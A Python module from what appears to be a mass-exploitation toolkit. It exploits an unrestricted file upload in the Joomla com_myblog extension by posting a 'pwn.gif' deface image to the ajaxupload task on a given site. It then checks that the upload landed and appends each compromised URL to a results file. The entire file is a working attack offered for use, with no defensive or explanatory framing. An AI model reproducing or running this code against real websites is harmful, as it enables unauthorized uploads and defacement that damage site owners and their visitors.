# coding=utf-8
import requests, re
import printModule


Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
Jce_Deface_image = 'files/pwn.gif'


def Exploit(site):
    try:
        fileindex = {'fileToUpload': open(Jce_Deface_image, 'rb')}
        Exp = 'http://' + site + '/index.php?option=com_myblog&task=ajaxupload'
        GoT = requests.post(Exp, files=fileindex, timeout=10, headers=Headers)
        if 'success' or 'File exists' in str(GoT.content):
            if '/images/pwn' in str(GoT.content):
                IndeXpath = 'http://' + site + '/images/pwn.gif'
            else:
                try:
                    GetPAth = re.findall("source: '(.*)'", str(GoT.content))
                    IndeXpath = GetPAth[0]
                except:
                    IndeXpath = 'http://' + site + '/images/pwn.gif'
            CheckIndex = requests.get(IndeXpath, timeout=10, headers=Headers)
            if 'GIF89a' in str(CheckIndex.content):
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(IndeXpath + '\n')
                return printModule.returnYes(site, 'N/A', 'Com_MyBlog', 'Joomla')
            else:
                return printModule.returnNo(site, 'N/A', 'Com_MyBlog', 'Joomla')
        else:
            return printModule.returnNo(site, 'N/A', 'Com_MyBlog', 'Joomla')
    except:
        return printModule.returnNo(site, 'N/A', 'Com_MyBlog', 'Joomla')